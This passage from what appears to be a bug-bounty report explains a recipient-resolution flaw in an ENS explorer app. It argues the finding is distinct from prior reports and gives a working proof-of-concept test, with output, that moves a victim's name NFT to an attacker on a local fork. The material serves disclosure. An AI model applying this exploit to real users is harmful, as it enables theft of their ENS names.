**"Your PoC runs your own re-implementation, not our code."** Answered by Part E, which imports `resolveAddressOrName`, `getResolvedAddress`, `getEnsOwner`, `resolveEnsOwner`, `getEnsTokenId` and `transferToken` from `apps/portal` and runs them, submitting the transfer through the real `@ens-apps/transaction-manager`. The only substitution is the RPC endpoint, and the reason it is needed is itself part of the finding: `getEnsOwner` calls `safeGetClient()` internally rather than taking the caller's client. The two paths agree exactly: the registration and the transfer produce byte-identical transaction hashes (`0xa36cf0dc...` and `0x49e46bb7...`) whether driven by `lib.mjs` or by the app's own functions, which is what makes the transliteration in Parts A through D checkable rather than asserted.

**"This is ENS protocol behaviour, not an app bug."** No contract misbehaved. The v2 registrar sold a free label to a paying customer. The UniversalResolver correctly reported that the name publishes no address. The app is the only component that decided a name with no address record has one.

**"It is a testnet name with no value."** What moves is an ENS v2 name token in the ETHRegistry, the asset the *Direct theft of user NFTs* row names. `apps/portal` is the in-scope asset and Sepolia is where the code under audit runs; the same code path on mainnet moves a mainnet name. The victim account is a real Sepolia holder impersonated on the fork, not a token the PoC minted for itself.

**"The exploitable population is tiny."** Stated in this report with its skew, before any argument is built on it. The set is not tiny in kind: it is the post-snapshot cohort, v1 names registered after the v2 reservation snapshot, whose twins are free (2026-08: 256 of 270 free, and all 256 exploitable). It is small on this testnet because this testnet has few registrants in that window, which 02c measures directly. No mainnet prevalence number is claimed.

***

## Not a duplicate

**Against #90161**, "Explorer authorizes a transfer against the raw name but moves the normalized name's token". Same sink file, entirely different cause. #90161 is about WHICH TOKEN moves: the `/$name` route param is normalized on the write side, so `getEnsTokenId({ label: getLabel(name) })` is a different name from the one the page authorized. Its fingerprint is `routes/$name/ownership*`, `getLabel.ts`, `useTransferName.ts`, `useCanTransferName.ts`, `useTransferDetachTargets.ts`, `transferToken.ts`, and its fix direction is "gate/canonicalize the route param". This finding is about WHICH RECIPIENT the token goes to. The token id here is correct, it is the victim's own name, the route param is irrelevant, and the defective line is `addUser.handlers.ts:29-34`, which appears in no prior fingerprint. Apply #90161's fix in full and this bug is untouched: `pieslicer.eth` is ENSIP-15 normalized and no route param is involved. Apply this report's fix, delete the owner fallback, and #90161 is untouched: that flow never calls `resolveAddressOrName`. Both fixes are independently required.

**Against #91314**, "Explorer's your-names list inherits ensjs's `resolvedAddress` default", which also exploits "an attacker can point something at you". Different root cause, different data, different sink. #91314 turns on the v1 subgraph's `resolvedAddress` field, written by `handleAddrChanged`, i.e. an attacker publishing an addr RECORD that puts their name into a stranger's list; its fix is in `useV1NamesForAddress.ts`'s filter. Here the attacker publishes NO record at all, which the transcript proves twice: `register(..., subregistry=0x0, resolver=0x0)`, and the UniversalResolver still answering null for `addr(60)` both before and after. The attacker's leverage is registry OWNERSHIP of a label in the v2 registry, and the defect is that the app treats registry ownership as an address record when no address record exists. Fixing the ensjs filter in `useV1NamesForAddress.ts` leaves `addUser.handlers.ts:29-34` substituting an owner for a missing record, and vice versa.

**Against #90190** (Manager `NamesTable.tsx:81-93`, `domain.normalizedName` in renew calldata) **and #90163** (Manager `routes/renew/$name.tsx`, `name-parser.ts:46`). Different app, different files, and both are raw-versus-ENSIP-15 label splits in the renewal calldata. Nothing in either fix touches address resolution, and nothing here involves normalization: `pieslicer.eth` normalizes to itself.

**Against #91837 and #91722** (Manager `setPrimaryName.ts:48`, the reverse registrar receiving the normalized name while every surface shows the raw one). Different app, different mechanism, and the outcome there is a reverse record. This report moves an ERC-1155.

**Against #91306** (resolver-roles editor builds transactions against a scope it never displays) **and #89270** (Manager profile records raw, owner/expiry normalized). Neither involves recipient resolution; neither fix touches `addUser.handlers.ts`. #91306 also depended on an undisplayed scope, whereas this report concedes that everything is displayed.

**Against #89279 and #89441.** #89279 is about a previous owner retaining control of what a transferred name resolves to (`computeResolverSalt` / `authorizeNameRoles`); #89441 is about certifying an unverified reverse record as forward-verified. Different files, different assets, and neither fix removes the owner fallback.

**Against the published known issues.** EXP-INPUT-005 (Medium): "ENS name validators accept inputs that ENS normalization later rejects or transforms, homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot, causing homograph-style display confusion in the UI rather than incorrect resolution." No homoglyph, no control character, no bidi, no stray dot. `pieslicer.eth` is plain ASCII and ENSIP-15 normalized, and `isNameOrAddress` accepts it correctly. There is no display confusion; the RESOLUTION is incorrect, which is exactly what that entry disclaims.

**WEB-1305 and QA-01** (Triage, Explorer): "Attempting to transfer V2 name roles to a V1 name stays pending indefinitely; this transfer should be blocked in the UI", and "Certain role combinations when transferring a name... cause errors when later updating profile records or setting a primary name." These are the nearest known issues in the same feature. Both are about a transfer that FAILS or leaves broken roles. Here the transfer SUCCEEDS, to the wrong party, and the name is gone. Blocking V2-roles-to-V1-name transfers in the UI, which is the stated WEB-1305 fix, does not touch a v2-to-EOA `safeTransferFrom` whose recipient came from the owner fallback.

**WEB-1257** (parent registry not detached after transfer), **WEB-1249** (subname creation replacing a child registry), **QA-03** (price display), **WEB-1301** (Manager address view showing primary-name values), **R2-04** (OG-image SSRF), **EXP-4337-002 / EXP-4337-003** (chainId and `request.from` not validated in the transaction manager): none of these involve resolving a recipient name, and none of their fixes changes `addUser.handlers.ts`.

## Proof of Concept

## Proof of Concept

Executed against a local Anvil fork of Sepolia. No live network was written to. Fork block 11635860, chain id 11155111.

This section is bounded by the submission form's character limit, so it carries **Part E in full** plus the **complete output of every other stage**. Part E is the strongest of them and is self-contained: it imports `apps/portal`'s own shipped functions and executes the theft with them, so it needs one file and a checkout of the audited branch, nothing else.

The supporting package (`lib.mjs`, `01`, `03`, `04`, `05`, `06`, `07`, the three population scripts and `run-all.sh`, about 2,400 lines) produced the transcripts reproduced below. Its sources are omitted here only for length and can be supplied in full on request. Nothing in the theft claim depends on reading them: `lib.mjs` re-implements `resolveAddressOrName` and `resolveEnsOwner` rather than importing them, and Part E removes any need to take that re-implementation on trust by running the shipped functions directly.

Both halves have been independently reproduced from this report by a third party who was given no access to the author's files.

***

### Environment

The fork:

```bash
anvil --fork-url https://sepolia.gateway.tenderly.co \
      --fork-block-number 11635860 --port 8545 --chain-id 11155111
```

Three things that will otherwise cost a reviewer time, all confirmed by independent reproduction:

* **Start from a clean anvil.** The scripts' guard only asks whether *an* anvil is answering on 8545, not whether it is clean or at the right block. A node left over from an earlier run makes the registration step fail with `label is not available in v2` (standalone) or `expected false to be true` (Part E), because the twin is already registered in that node's state. Kill any existing anvil and delete `state.json` first.
* **Use an upstream that serves archive state at 11635860.** `https://sepolia.gateway.tenderly.co` does. Of the common alternates, `ethereum-sepolia-rpc.publicnode.com` is inconsistent, `rpc.sepolia.org` is dead, and `sepolia.drpc.org` is paywalled. This pin is the most perishable part of the package; as the block ages out of public archives `FORK_BLOCK` will need moving, which changes the sampled population figures but not the theft.
* **Files written out of a markdown fence are `0644`.** `chmod +x run-all.sh` before running it.

Every standalone script calls `assertLocalAnvilFork()` before doing anything, which requires a loopback host, `web3_clientVersion` containing "anvil", `eth_chainId == 11155111`, and a non-zero `anvil_nodeInfo` fork block, so no script can reach a live network. Contract addresses come from `extendChainWithEns(sepolia)`, the app's own chain object, not from constants ( `06` and `07` are the exception: both hardcode the v1 PublicResolver `0x8FADE66B79cC9f707aB26799354482EB93a5B7dD`, which `05` R3 reads off `gomets.eth` at runtime).

Dependencies: `viem ^2.56.3`, `@ensdomains/ensjs` pinned to the `pkg.pr.new` build `e96662c`, `@adraffy/ens-normalize ^1.11.1`.

Two accounts are impersonated rather than controlled: the victim, and the v1 registry owners used in the mitigation tests. The attacker is **not** impersonated: it is derived from a fixed seed and asserted to carry no code, so it is a plain EOA paying for its own registration. Because the victim is impersonated, the transfer carries an anvil signature rather than a real one; the finding is about which address the app resolves the typed name to, and in the real flow the victim signs willingly.

***

### Part E. The theft, executed by `apps/portal`'s own functions

This is the primary proof. Nothing in it re-implements the app. Every function in the chain is the shipped one:

| Imported from                                   | What it is                                                      |
| ----------------------------------------------- | --------------------------------------------------------------- |
| `@/features/roles/helpers/addUser.handlers`     | `resolveAddressOrName`, the defect itself                       |
| `@/features/address/queries/getResolvedAddress` | its one caller, the query `useAddressResolution` runs           |
| `@/features/profile/hooks/useEnsOwner`          | `getEnsOwner`, the owner fallback's entry point                 |
| `@/utils/ens/resolveEnsOwner`                   | `resolveEnsOwner`, v2 before v1                                 |
| `@/features/profile/hooks/useTokenId`           | `getEnsTokenId`, the token id                                   |
| `@/features/transfer/helpers/transferToken`     | the ERC-1155 move, via the real `@ens-apps/transaction-manager` |
| `@/lib/constants/universalResolver`             | `universalResolverAddress`                                      |

The substitution is the RPC endpoint. `@/lib/wagmi` is mocked with `importActual` and every export passes through unchanged except `wagmiConfig.getClient()`, which returns a viem client pointed at the fork. This is required because `getEnsOwner`, `getEnsTokenId` and `getResolvedAddress` all call `safeGetClient()` internally rather than taking the caller's client, so without it the owner fallback would resolve against live Sepolia. It is the same redirection the app performs in ordinary local E2E, where `vite.config.ts:22-26` proxies `/rpc` to `127.0.0.1:8545`. No resolution, authorization or calldata logic is replaced, and `sepoliaWithEns` stays real, so `universalResolverAddress` is still derived by the app.

Two second-order consequences of that swap, stated so "only the RPC endpoint" is not read too broadly. Neither can change a resolved value. The fork client is a bare `http()` transport where the shipped one is `fallback()` with request batching (`lib/wagmi.ts:36-48`), which `resolveEnsOwner.ts:48-51` relies on to coalesce two reads. And the mocked `wagmiConfig` is a plain object spread, carrying only the members this path touches; anything else throws rather than quietly returning something different.

One piece of app logic is restated rather than imported: the UniversalResolver probe printing `urBefore`/`urAfter` calls `getEnsAddress` with `universalResolverAddress` directly, mirroring `addUser.handlers.ts:20-23`. It is a diagnostic. Every assertion runs through the imported functions.

File goes at `apps/portal/.poc/explorer-recipient-fallback.test.ts` in a checkout of the audited branch.

```ts
/**
 * PoC (app-code path) - THE RESOLUTION AND THE TRANSFER ARE PERFORMED BY
 * apps/portal's OWN FUNCTIONS. Nothing in this file re-implements the app.
 *
 * Every function under test is imported from the shipped source:
 *
 *   resolveAddressOrName  @/features/roles/helpers/addUser.handlers   (the defect)
 *   getResolvedAddress    @/features/address/queries/getResolvedAddress (its one caller)
 *   getEnsOwner           @/features/profile/hooks/useEnsOwner          (the owner fallback)
 *   resolveEnsOwner       @/utils/ens/resolveEnsOwner                   (v2 before v1)
 *   getEnsTokenId         @/features/profile/hooks/useTokenId           (the token id)
 *   transferToken         @/features/transfer/helpers/transferToken     (the ERC-1155 move)
 *   universalResolverAddress  @/lib/constants/universalResolver
 *
 * The substitution is the RPC endpoint. `@/lib/wagmi` is mocked with
 * importActual and every export is passed through unchanged except
 * `wagmiConfig.getClient()`, which returns a viem client whose transport points
 * at the local anvil fork. That is the same redirection the app performs in
 * ordinary local E2E (vite.config.ts:22-26 proxies /rpc to 127.0.0.1:8545); no
 * resolution, authorization or calldata logic is replaced. Two second-order
 * differences that follow from it, neither able to change a resolved value:
 * the fork client is a bare http() transport where the real one is fallback()
 * with request batching (lib/wagmi.ts:36-48), and the mocked wagmiConfig is a
 * plain object spread, so it keeps only the members this path uses.
 *
 * The transfer is submitted through the real @ens-apps/transaction-manager via
 * the app's own `transferToken`. No calldata is hand-built on the theft path.
 * The one piece of app logic restated here is the UniversalResolver probe
 * (getEnsAddress with universalResolverAddress, mirroring
 * addUser.handlers.ts:20-23) used to print urBefore/urAfter. It is a
 * diagnostic; every assertion runs through the imported app functions.
 *
 * The victim is impersonated with anvil_autoImpersonateAccount rather than
 * signed for, so the transfer carries an anvil signature. The finding is about
 * which address the app resolves to; in the real flow the victim signs
 * willingly.
 *
 * Local Anvil Sepolia fork only. Fork block 11635860. Start from a CLEAN anvil:
 * the twin registration in A2 asserts the label is still available, so a node
 * that already ran this test (or Part A) fails at that assertion.
 *
 * Run:
 *   pnpm --filter portal exec vitest run .poc/explorer-recipient-fallback.test.ts --reporter=verbose
 */
import { erc1155Abi, keccak256, namehash, parseAbi, stringToHex, toHex, zeroAddress } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { getEnsAddress } from 'viem/actions'
import { expect, it, vi } from 'vitest'

const RPC = vi.hoisted(() => process.env.POC_RPC_URL ?? 'http://127.0.0.1:8545')

// Only the endpoint is redirected. Every other export of @/lib/wagmi - including
// sepoliaWithEns, which @/lib/constants/universalResolver derives the
// UniversalResolver address from - is the real one.
vi.mock('@/lib/wagmi', async (importActual) => {
  const actual = await importActual<typeof import('@/lib/wagmi')>()
  const { createClient, http } = await import('viem')
  const forkClient = createClient({
    chain: actual.sepoliaWithEns,
    transport: http(RPC),
  })
  return {
    ...actual,
    wagmiConfig: { ...actual.wagmiConfig, getClient: () => forkClient },
  }
})

// --- the app, unmocked -----------------------------------------------------
import { getResolvedAddress } from '@/features/address/queries/getResolvedAddress'
import { getEnsOwner } from '@/features/profile/hooks/useEnsOwner'
import { getEnsTokenId } from '@/features/profile/hooks/useTokenId'
import { resolveAddressOrName } from '@/features/roles/helpers/addUser.handlers'
import { transferToken } from '@/features/transfer/helpers/transferToken'
import { universalResolverAddress } from '@/lib/constants/universalResolver'
import { sepoliaWithEns } from '@/lib/wagmi'
import { resolveEnsOwner } from '@/utils/ens/resolveEnsOwner'

const RECIPIENT_NAME = process.env.RECIPIENT_NAME ?? 'pieslicer.eth'
const VICTIM_NAME = process.env.VICTIM_NAME ?? 'stronghold.eth'
const LABEL = RECIPIENT_NAME.split('.')[0]

const rpc = async (method: string, params: unknown[] = []) => {
  const res = await fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  })
  const json = (await res.json()) as { result?: unknown; error?: unknown }
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`)
  return json.result as never
}

const hr = (t: string) => console.log(`\n======== ${t} ${'='.repeat(Math.max(0, 58 - t.length))}`)

it('the app resolves a recipient name to a stranger and the app moves the victim NFT there', { timeout: 300_000 }, async () => {
  const { createPublicClient, createWalletClient, http } = await import('viem')
  const pub = createPublicClient({ chain: sepoliaWithEns, transport: http(RPC) })

  // ---------------------------------------------------------------- guard
  hr('GUARD')
  const url = new URL(RPC)
  expect(['127.0.0.1', 'localhost', '[::1]']).toContain(url.hostname)
  const clientVersion = await rpc('web3_clientVersion')
  expect(String(clientVersion)).toMatch(/anvil/i)
  expect(Number(await rpc('eth_chainId'))).toBe(11155111)
  const nodeInfo = (await rpc('anvil_nodeInfo')) as {
    forkConfig?: { forkBlockNumber?: number }
  }
  const forkBlock = nodeInfo?.forkConfig?.forkBlockNumber
  expect(forkBlock).toBeTruthy()
  console.log(`  ${RPC} ok: ${clientVersion}, chainId 11155111, fork block ${forkBlock}`)
  console.log(`  universalResolverAddress (from the app's own constant) = ${universalResolverAddress}`)

  // -------------------------------------------------- A1. before the attack
  hr('A1. RESOLUTION BEFORE THE ATTACK, VIA THE APP')
  const urBefore = await getEnsAddress(pub, {
    name: RECIPIENT_NAME,
    universalResolverAddress,
  })
  const ownerBefore = await resolveEnsOwner(pub, RECIPIENT_NAME)
  const beforeDirect = await resolveAddressOrName({ client: pub, nameOrAddress: RECIPIENT_NAME })
  const beforeQuery = await getResolvedAddress({ nameOrAddress: RECIPIENT_NAME })
  console.log(`  typed into SendNameForm's Recipient field : "${RECIPIENT_NAME}"`)
  console.log(`  UniversalResolver addr(60)                : ${urBefore}   (no record -> fallback fires)`)
  console.log(`  app resolveEnsOwner()                     : ${JSON.stringify(ownerBefore)}`)
  console.log(`  app resolveAddressOrName()                : ${beforeDirect}`)
  console.log(`  app getResolvedAddress()  (the query the hook runs) : ${beforeQuery.isOk() ? beforeQuery.value : 'ERR'}`)
  expect(urBefore).toBeNull()
  expect(beforeDirect).toBe(ownerBefore?.owner)

  // ------------------------------------------------ A2. one v2 registration
  hr('A2. THE ATTACKER MAKES ONE ORDINARY v2 REGISTRATION')
  // Not app code: this is the attacker's own action, performed with viem.
  // Same fixed seed as the standalone PoC's lib.mjs deriveActor('attacker').
  const attacker = privateKeyToAccount(keccak256(stringToHex('c7-poc/attacker')))
  const code = await pub.getCode({ address: attacker.address })
  expect(code ?? '0x').toBe('0x') // plain EOA, no EIP-7702 delegation
  console.log(`  attacker ${attacker.address}  code=0x (plain EOA)`)
  await rpc('anvil_setBalance', [attacker.address, '0x' + (100n * 10n ** 18n).toString(16)])
  const attackerWallet = createWalletClient({ account: attacker, chain: null, transport: http(RPC) })

  const { getChainContractAddress } = await import('@ensdomains/ensjs/chain')
  const registrar = getChainContractAddress({ chain: sepoliaWithEns, contract: 'ensEthRegistrar' }) as `0x${string}`
  const legacyRegistry = getChainContractAddress({ chain: sepoliaWithEns, contract: 'ensLegacyRegistry' }) as `0x${string}`
  const usdc = getChainContractAddress({ chain: sepoliaWithEns, contract: 'usdc' }) as `0x${string}`

  const registrarAbi = parseAbi([
    'function isAvailable(string label) view returns (bool)',
    'function MIN_COMMITMENT_AGE() view returns (uint64)',
    'function makeCommitment(string,address,bytes32,address,address,uint64,bytes32) view returns (bytes32)',
    'function commit(bytes32)',
    'function register(string,address,bytes32,address,address,uint64,address,bytes32)',
  ])
  const erc20 = parseAbi([
    'function mint(address,uint256)',
    'function approve(address,uint256) returns (bool)',
  ])

  expect(
    await pub.readContract({ address: registrar, abi: registrarAbi, functionName: 'isAvailable', args: [LABEL] }),
  ).toBe(true)

  const DURATION = 31536000n
  const SECRET = keccak256(toHex('c7-poc-secret'))
  const REFERRER = '0x0000000000000000000000000000000000000000000000000000000000000000' as const

  for (const [fn, args] of [
    ['mint', [attacker.address, 10n ** 12n]],
    ['approve', [registrar, 10n ** 12n]],
  ] as const) {
    await pub.waitForTransactionReceipt({
      hash: await attackerWallet.writeContract({ address: usdc, abi: erc20, functionName: fn, args: args as never, chain: null }),
    })
  }

  const commitment = await pub.readContract({
    address: registrar, abi: registrarAbi, functionName: 'makeCommitment',
    args: [LABEL, attacker.address, SECRET, zeroAddress, zeroAddress, DURATION, REFERRER],
  })
  await pub.waitForTransactionReceipt({
    hash: await attackerWallet.writeContract({ address: registrar, abi: registrarAbi, functionName: 'commit', args: [commitment], chain: null }),
  })
  const minAge = await pub.readContract({ address: registrar, abi: registrarAbi, functionName: 'MIN_COMMITMENT_AGE' })
  await rpc('evm_increaseTime', [Number(minAge) + 10])
  await rpc('evm_mine')
  const regRc = await pub.waitForTransactionReceipt({
    hash: await attackerWallet.writeContract({
      address: registrar, abi: registrarAbi, functionName: 'register',
      // subregistry 0x0, resolver 0x0: the attacker publishes NOTHING.
      args: [LABEL, attacker.address, SECRET, zeroAddress, zeroAddress, DURATION, usdc, REFERRER],
      chain: null,
    }),
  })
  console.log(`  register("${LABEL}", owner=attacker, subregistry=0x0, resolver=0x0) = ${regRc.status}`)
  console.log(`  tx ${regRc.transactionHash}`)

  // ------------------------------------------------- A3. the flip, via the app
  hr('A3. RESOLUTION AFTER THE ATTACK, VIA THE APP')
  const urAfter = await getEnsAddress(pub, { name: RECIPIENT_NAME, universalResolverAddress })
  const ownerAfter = await resolveEnsOwner(pub, RECIPIENT_NAME)
  const afterDirect = await resolveAddressOrName({ client: pub, nameOrAddress: RECIPIENT_NAME })
  const afterQuery = await getResolvedAddress({ nameOrAddress: RECIPIENT_NAME })
  const afterOwnerHook = await getEnsOwner({ name: RECIPIENT_NAME })
  console.log(`  UniversalResolver addr(60)                : ${urAfter}   (still no record)`)
  console.log(`  app resolveEnsOwner()                     : ${JSON.stringify(ownerAfter)}`)
  console.log(`  app getEnsOwner() (the hook's query)      : ${afterOwnerHook.isOk() ? JSON.stringify(afterOwnerHook.value) : 'ERR'}`)
  console.log(`  app resolveAddressOrName()  ==> RECIPIENT : ${afterDirect}`)
  console.log(`  app getResolvedAddress()    ==> RECIPIENT : ${afterQuery.isOk() ? afterQuery.value : 'ERR'}`)
  console.log(`  attacker                                  : ${attacker.address}`)
  expect(urAfter).toBeNull()
  expect(afterDirect?.toLowerCase()).toBe(attacker.address.toLowerCase())
  expect(afterQuery.isOk() && String(afterQuery.value).toLowerCase()).toBe(attacker.address.toLowerCase())

  const v1OwnerNow = await pub.readContract({
    address: legacyRegistry,
    abi: parseAbi(['function owner(bytes32) view returns (address)']),
    functionName: 'owner',
    args: [namehash(RECIPIENT_NAME)],
  })
  console.log(`  v1 registry owner(namehash) still         : ${v1OwnerNow}  (attacker never touched v1)`)
  expect(v1OwnerNow).toBe(ownerBefore?.owner)

  // ------------------------------------------------------- B. the theft
  hr('B. THE TRANSFER, SUBMITTED BY THE APP\'S OWN transferToken')
  const victimOwner = await resolveEnsOwner(pub, VICTIM_NAME)
  expect(victimOwner?.protocolVersion).toBe('ENSv2')
  const victim = victimOwner!.owner as `0x${string}`
  const registryAddress = victimOwner!.registryAddress as `0x${string}`

  // The app's own token id: useTransferName.ts:112-115 -> getEnsTokenId().
  const tokenIdResult = await getEnsTokenId({ label: VICTIM_NAME.split('.')[0], registryAddress })
  expect(tokenIdResult.isOk()).toBe(true)
  const tokenId = tokenIdResult._unsafeUnwrap()
  console.log(`  victim                : ${victim}`)
  console.log(`  victim's v2 name      : ${VICTIM_NAME}`)
  console.log(`  app getEnsTokenId()   : ${tokenId}`)

  const balOf = (who: `0x${string}`) =>
    pub.readContract({ address: registryAddress, abi: erc1155Abi, functionName: 'balanceOf', args: [who, tokenId] })

  const vBefore = await balOf(victim)
  const aBefore = await balOf(attacker.address)
  console.log(`  balanceOf(victim  , tokenId) = ${vBefore}`)
  console.log(`  balanceOf(attacker, tokenId) = ${aBefore}`)
  expect(vBefore).toBe(1n)
  expect(aBefore).toBe(0n)

  await rpc('anvil_autoImpersonateAccount', [true])
  await rpc('anvil_setBalance', [victim, '0x' + (100n * 10n ** 18n).toString(16)])
  const victimWallet = createWalletClient({ account: victim, chain: sepoliaWithEns, transport: http(RPC) })

  // THE APP'S OWN HELPER, with the app's own arguments (useTransferName.ts:143).
  const result = await transferToken({
    name: VICTIM_NAME,
    registryAddress,
    tokenId,
    recipient: afterDirect!, // what the app resolved the typed name to
    walletClient: victimWallet,
    publicClient: pub as never,
    signer: { type: 'eoa', walletClient: victimWallet } as never,
    chainId: sepoliaWithEns.id,
    id: 'poc-recipient-fallback',
  })
  console.log(`  transferToken txId ${result.txId}  hash ${result.hash}`)
  const rc = await pub.getTransactionReceipt({ hash: result.hash })
  console.log(`  to ${rc.to}  status ${rc.status}`)

  const vAfter = await balOf(victim)
  const aAfter = await balOf(attacker.address)
  hr('RESULT')
  console.log(`  balanceOf(victim  , tokenId) = ${vAfter}`)
  console.log(`  balanceOf(attacker, tokenId) = ${aAfter}`)
  console.log(`  app resolveEnsOwner("${VICTIM_NAME}") = ${JSON.stringify(await resolveEnsOwner(pub, VICTIM_NAME))}`)
  console.log(`  NFT STOLEN: ${vBefore === 1n && vAfter === 0n && aBefore === 0n && aAfter === 1n}`)
  expect(vAfter).toBe(0n)
  expect(aAfter).toBe(1n)
})
```

```bash
pnpm --filter portal exec vitest run .poc/explorer-recipient-fallback.test.ts --reporter=verbose
```

The workspace package is named `portal`, not `@ens-apps/portal`; the latter filter matches nothing. `npx vitest run .poc/explorer-recipient-fallback.test.ts --reporter=verbose` from `apps/portal` is equivalent.

Actual output:

```
======== GUARD =====================================================
  http://127.0.0.1:8546 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860
  universalResolverAddress (from the app's own constant) = 0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe
======== A1. RESOLUTION BEFORE THE ATTACK, VIA THE APP =============
  typed into SendNameForm's Recipient field : "pieslicer.eth"
  UniversalResolver addr(60)                : null   (no record -> fallback fires)
  app resolveEnsOwner()                     : {"owner":"0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750","registryAddress":"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e","protocolVersion":"ENSv1"}
  app resolveAddressOrName()                : 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  app getResolvedAddress()  (the query the hook runs) : 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
======== A2. THE ATTACKER MAKES ONE ORDINARY v2 REGISTRATION =======
  attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7  code=0x (plain EOA)
  register("pieslicer", owner=attacker, subregistry=0x0, resolver=0x0) = success
  tx 0xa36cf0dc8ed953b38de9eca4d0344704fd767991858f745cabd1fa61f7dd2d62
======== A3. RESOLUTION AFTER THE ATTACK, VIA THE APP ==============
  UniversalResolver addr(60)                : null   (still no record)
  app resolveEnsOwner()                     : {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}
  app getEnsOwner() (the hook's query)      : {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}
  app resolveAddressOrName()  ==> RECIPIENT : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  app getResolvedAddress()    ==> RECIPIENT : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  attacker                                  : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  v1 registry owner(namehash) still         : 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750  (attacker never touched v1)
======== B. THE TRANSFER, SUBMITTED BY THE APP'S OWN transferToken =
  victim                : 0x345929dc2E57817C16AEDc65f5e0cF2817299406
  victim's v2 name      : stronghold.eth
  app getEnsTokenId()   : 38424076124039839195221280089598108906984212041120748309434213820982934634496
  balanceOf(victim  , tokenId) = 1
  balanceOf(attacker, tokenId) = 0
  transferToken txId poc-recipient-fallback  hash 0x49e46bb72bd197230b288445585b2a81f6359f346ec20bc91cc3e543b592e297
  to 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2  status success
======== RESULT ====================================================
  balanceOf(victim  , tokenId) = 0
  balanceOf(attacker, tokenId) = 1
  app resolveEnsOwner("stronghold.eth") = {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}
  NFT STOLEN: true
```

The assertions are in the test, so the pass is the claim: `resolveAddressOrName` returns the v1 owner before the registration and the attacker after it, the UniversalResolver returns null throughout, the v1 registry is untouched, and the victim's balance goes 1 to 0 while the attacker's goes 0 to 1.

`getResolvedAddress()` and `resolveAddressOrName()` return the same attacker address, so the flip is demonstrated at the app's real integration point and not only at the helper beneath it. The transfer hash `0x49e46bb7...` is the same one the standalone Part B produced from hand-built calldata, which corroborates that `transferToken.ts:67-71` and the re-implementation encode identically. That corroboration is a convenience, not the argument; the argument is that Part E imports the shipped functions and runs them.

Part E does not render `SendNameForm`. It takes the recipient from the app's own resolution query and hands it to the app's own `transferToken`, which is the value the form passes at `SendNameForm.tsx:107-108`. Importing the app's wagmi config also causes `@reown/appkit` one failed outbound fetch to `api.web3modal.org`, which is logged. No chain read leaves the fork.

***

### `poc/lib.mjs`, the supporting package's core

Included because it is the one omitted file a reviewer is likely to want by eye. Section 1 is the network guard. Section 2 takes every contract address from the app's own chain object. Section 3 is the transliteration of `resolveAddressOrName` and `resolveEnsOwner`, with the shipped source quoted in the docblock above each so the two can be compared without leaving this page. Section 5 explains why no anvil default account is used as an actor.

Part E exists so that this transliteration does not have to be trusted; it is reproduced here so it can be checked.

```js
/**
 * C7 PoC shared library.
 *
 * Two jobs:
 *   1. Refuse to run against anything except a local anvil Sepolia fork.
 *   2. Re-implement, line for line, the two pieces of apps/portal logic under
 *      test, so every address the PoC prints is produced by the shipped
 *      resolution order and not by a shortcut.
 *
 * Contract addresses are NOT hardcoded here: they are read out of the exact
 * chain object the app builds (extendChainWithEns(sepolia) from
 * @ensdomains/ensjs/chain, which is what apps/portal/src/lib/wagmi.ts exports as
 * `sepoliaWithEns`), so they cannot drift from the app.
 */
import fs from 'node:fs'
import { createPublicClient, createWalletClient, http } from 'viem'
import { sepolia } from 'viem/chains'
import { extendChainWithEns, getChainContractAddress } from '@ensdomains/ensjs/chain'

export const RPC = 'http://127.0.0.1:8545'

// ---------------------------------------------------------------------------
// 1. Import-time network guard.
// ---------------------------------------------------------------------------
// Asserted at import time so no script in this PoC can silently touch a live
// network: the URL must be loopback, the node must self-identify as anvil, and
// it must be a *fork* (a non-zero fork block config) of chain 11155111.
async function rpc(method, params = []) {
  const res = await fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  })
  const json = await res.json()
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`)
  return json.result
}

export async function assertLocalAnvilFork() {
  const url = new URL(RPC)
  if (!['127.0.0.1', 'localhost', '[::1]'].includes(url.hostname)) {
    throw new Error(`REFUSING TO RUN: RPC ${RPC} is not loopback`)
  }
  const clientVersion = await rpc('web3_clientVersion')
  if (!/anvil/i.test(clientVersion)) {
    throw new Error(`REFUSING TO RUN: ${RPC} is not anvil (${clientVersion})`)
  }
  const chainId = Number(await rpc('eth_chainId'))
  if (chainId !== 11155111) {
    throw new Error(`REFUSING TO RUN: chainId ${chainId} is not Sepolia`)
  }
  const cfg = await rpc('anvil_nodeInfo')
  const forkBlock = cfg?.forkConfig?.forkBlockNumber ?? cfg?.fork_config?.fork_block_number
  if (!forkBlock) {
    throw new Error('REFUSING TO RUN: anvil is not forking anything')
  }
  const head = Number(await rpc('eth_blockNumber'))
  console.log(
    `[guard] ${RPC} ok: ${clientVersion}, chainId ${chainId}, fork block ${forkBlock}, head ${head}`,
  )
  return { clientVersion, chainId, forkBlock, head }
}

export const anvil = rpc

